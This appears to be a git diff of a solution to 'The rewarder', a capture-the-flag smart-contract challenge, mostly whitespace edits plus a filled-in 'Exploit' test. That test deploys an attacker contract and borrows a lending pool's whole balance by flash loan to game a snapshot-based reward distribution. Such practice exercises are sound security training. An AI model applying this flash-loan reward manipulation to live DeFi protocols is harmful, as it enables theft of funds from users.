@@ -45,7 +45,7 @@ describe('[Challenge] The rewarder', function () {
 
         // Advance time 5 days so that depositors can get rewards
         await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
-        
+
         // Each depositor gets 25 reward tokens
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.connect(users[i]).distributeRewards();
@@ -57,7 +57,7 @@ describe('[Challenge] The rewarder', function () {
 
         // Attacker starts with zero DVT tokens in balance
         expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
-        
+
         // Two rounds should have occurred so far
         expect(
             await this.rewarderPool.roundNumber()
@@ -66,11 +66,29 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Deploy attacker contract
+        const RewarderAttacker = await ethers.getContractFactory("RewarderAttacker", attacker)
+        const rewarderAttacker = await RewarderAttacker.deploy(
+            this.flashLoanPool.address,
+            this.rewarderPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address
+        )
+        // Advance time 5 days . Use flashloan to a get snapshot with total flashloan balance
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        //Call flashloan with total balance from flashloan
+        // Deposit to rewarder pool
+        // Withdraw from pool
+        //Return flashloan 
+        const flashloanPoolBalance = await this.liquidityToken.balanceOf(this.flashLoanPool.address)
+        await rewarderAttacker.getFlashLoan(flashloanPoolBalance)
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Only one round should have taken place
         expect(
             await this.rewarderPool.roundNumber()
@@ -80,20 +98,17 @@ describe('[Challenge] The rewarder', function () {
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.connect(users[i]).distributeRewards();
             let rewards = await this.rewardToken.balanceOf(users[i].address);
-            
             // The difference between current and previous rewards balance should be lower than 0.01 tokens
             let delta = rewards.sub(ethers.utils.parseEther('25'));
             expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
         }
-        
+
         // Rewards must have been issued to the attacker account
         expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
         let rewards = await this.rewardToken.balanceOf(attacker.address);
-
         // The amount of rewards earned should be really close to 100 tokens
         let delta = ethers.utils.parseEther('100').sub(rewards);
         expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));
-
         // Attacker finishes with zero DVT tokens in balance
         expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
     });
